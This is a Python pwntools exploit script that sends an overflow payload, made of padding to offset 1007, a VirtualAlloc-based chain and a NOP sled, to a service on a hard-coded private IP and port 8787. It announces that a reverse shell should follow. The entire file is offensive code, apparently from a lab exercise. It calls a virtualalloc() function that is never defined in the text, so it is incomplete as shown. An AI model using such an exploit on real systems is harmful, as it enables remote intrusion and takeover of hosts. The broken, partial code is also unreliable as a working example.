#!/usr/bin/python
from pwn import *
from struct import pack

# Exploit Information
# ---------------------------

ip = "192.168.223.141"
port = 8787
offset = 1007

print("[!] Target Information")
print("[!] IP Address : " + ip)
print("[!] Port : "+ str(port))

# ---------------------------

def build_payload():
    va = virtualalloc()
    pattern = b'A' * (offset - len(va))

    payload  = b'meow '
    payload += pattern
    payload += va
    payload += b'\x90' * 40
    return payload

def main():
    r = remote(ip, port)
    r.recvuntil(b']')
    payload = build_payload()
    print("[+] Payload Length : " + str(len(payload)))

    r.sendline(payload)
    print("[+] Send Payload !")
    print("[+] Target crashed, reverse shell shall be back ;)")

main()
